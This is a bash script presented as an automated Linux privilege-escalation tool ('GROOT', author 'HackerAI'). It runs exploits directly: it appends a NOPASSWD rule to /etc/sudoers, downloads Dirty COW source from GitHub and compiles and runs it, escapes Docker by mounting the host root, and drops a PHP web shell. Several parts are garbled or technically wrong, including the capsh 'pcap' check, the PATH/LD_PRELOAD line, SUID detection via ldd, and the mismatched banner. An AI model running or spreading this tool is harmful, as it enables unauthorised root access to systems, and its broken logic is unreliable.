#!/bin/bash
# AUTOROOT (GROOT) - Linux Privilege Escalation Automator
# Multi-vector LPE scanner & exploiter untuk semua distro Linux
# Author: HackerAI | No kernel dependency - universal LPE

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'

GROOT_BANNER() {
    clear
    echo -e "${PURPLE}"
    echo "  ██████╗ ███████╗██╗  ██╗ ██████╗ ██████╗ ██╗██████╗"
    echo "  ██╔══██╗██╔════╝╚██╗██╔╝██╔═══██╗██╔══██╗██║██╔══██╗"
    echo "  ██████╔╝█████╗   ╚███╔╝ ██║   ██║██████╔╝██║██║  ██║"
    echo "  ██╔══██╗██╔══╝   ██╔██╗ ██║   ██║██╔══██╗██║██║  ██║"
    echo "  ██║  ██║███████╗██╔╝ ██╗╚██████╔╝██║  ██║██║██████╔╝"
    echo "  ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝╚═════╝${NC}"
    echo -e "${CYAN}     [=] Linux Privilege Escalation Automator [=]${NC}\n"
}

check_root() {
    if [ "$EUID" -eq 0 ]; then
        echo -e "${GREEN}[+] ROOT SHELL DETECTED!${NC}"
        echo -e "${GREEN}[+] uid=$(id -u)($(whoami)) gid=$(id -g)($(id -gn))${NC}\n"
        /bin/bash
        exit 0
    fi
}

lpe_suid() {
    echo -e "${YELLOW}[*] Scanning SUID Binaries...${NC}"
    find / -perm -4000 -type f 2>/dev/null | while read bin; do
        case "$(file "$bin" | cut -d: -f2)" in
            *ELF*64-bit*) btype="x64";;
            *ELF*32-bit*) btype="x86";;
            *) continue;;
        esac
        
        # GTFOBins check
        if ldd "$bin" 2>/dev/null | grep -q -E "(libproc|find|vim|awk|python|perl|ruby)"; then
            echo -e "${GREEN}[+] EXPLOITABLE SUID: $bin${NC}"
            case $bin in
                */find|*/awk|*/vim|*/python*|*/perl*|*/ruby*)
                    echo -e "${CYAN}    $ $bin /etc/passwd | grep root${NC}"
                    ;;
                *)
                    echo -e "${CYAN}    $ $bin -p${NC}"
                    ;;
            esac
        fi
    done
}

lpe_writable_config() {
    echo -e "${YELLOW}[*] Checking Writable Configs...${NC}"
    
    # sudoers writable
    if [ -w /etc/sudoers ]; then
        echo -e "${GREEN}[+] /etc/sudoers WRITABLE!${NC}"
        echo "root ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
        sudo -i && exit
    fi
    
    # Wildcard sudo
    sudo -l 2>/dev/null | grep -q "(ALL) NOPASSWD: ALL" && sudo -i && exit
    
    # Cron jobs writable
    find /etc/cron* /var/spool/cron -writable 2>/dev/null | while read cron; do
        echo -e "${GREEN}[+] WRITABLE CRON: $cron${NC}"
    done
}

lpe_kernel() {
    echo -e "${YELLOW}[*] Kernel Exploits...${NC}"
    uname -r | grep -q "2.6\|3\." && {
        echo -e "${GREEN}[+] Dirty COW (CVE-2016-5195) DETECTED${NC}"
        wget -q -O /tmp/dirtycow https://raw.githubusercontent.com/scannell-dev/linux-kernel-exploits/master/dirtycow/dirtycow.c
        gcc -pthread /tmp/dirtycow -o /tmp/dcow
        /tmp/dcow
    }
}

lpe_docker() {
    echo -e "${YELLOW}[*] Container Escapes...${NC}"
    
    # Docker
    if [ -f /.dockerenv ] || groups | grep -q docker; then
        echo -e "${GREEN}[+] Docker/Container Escape${NC}"
        docker run -v /:/mnt --rm -it alpine chroot /mnt sh -c 'echo "ROOT" && /bin/sh'
    fi
    
    # Docker socket
    [ -S /var/run/docker.sock ] && {
        echo -e "${GREEN}[+] Docker.sock accessible${NC}"
        docker run -v /:/host -v /var/run/docker.sock:/var/run/docker.sock --rm -it alpine chroot /host sh
    }
}

lpe_pcap() {
    echo -e "${YELLOW}[*] PCAP Abuse...${NC}"
    capsh --has-pcap || return
    echo -e "${GREEN}[+] PCAP capability abuse${NC}"
    capsh --caps=cap_sys_admin+eip -- -c "python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'"
}

lpe_systemd() {
    echo -e "${YELLOW}[*] Systemd Abuse...${NC}"
    if systemctl status | grep -q "Static"; then
        echo -e "${GREEN}[+] Systemd User Service${NC}"
        mkdir -p ~/.config/systemd/user
        echo -e "[Unit]\nDescription=HACK\n[Service]\nExecStart=/bin/sh -p\n[Install]\nWantedBy=default.target" > ~/.config/systemd/user/hack.service
        systemctl --user daemon-reload
        systemctl --user start hack
    fi
}

lpe_env() {
    echo -e "${YELLOW}[*] Environment Variables...${NC}"
    PATH=$(which ls) && LD_PRELOAD=$(find /tmp /dev/shm -name "*.so" 2>/dev/null | head -1) && sudo ls
}

lpe_fastcgi() {
    echo -e "${YELLOW}[*] FastCGI Abuse...${NC}"
    pgrep -f fcgi && {
        echo -e "${GREEN}[+] PHP-FPM Misconfig${NC}"
        echo "<?php system(\$_GET['cmd']); ?>" > /tmp/shell.php
        curl -d "cmd=id" http://localhost/shell.php
    }
}

GROOT_MAIN() {
    GROOT_BANNER
    check_root
    
    echo -e "${GREEN}[*] Current User: $(whoami) ($(id))${NC}"
    echo -e "${GREEN}[*] OS: $(cat /etc/os-release | grep PRETTY_NAME | cut -d'"' -f2)${NC}\n"
    
    lpe_suid
    lpe_writable_config
    lpe_kernel
    lpe_docker
    lpe_pcap
    lpe_systemd
    lpe_env
    lpe_fastcgi
    
    echo -e "\n${RED}[!] No auto-exploit found. Manual enum required.${NC}"
    echo -e "${YELLOW}[*] Run: linpeas.sh | linux-exploit-suggester${NC}"
}

# Execute
GROOT_MAIN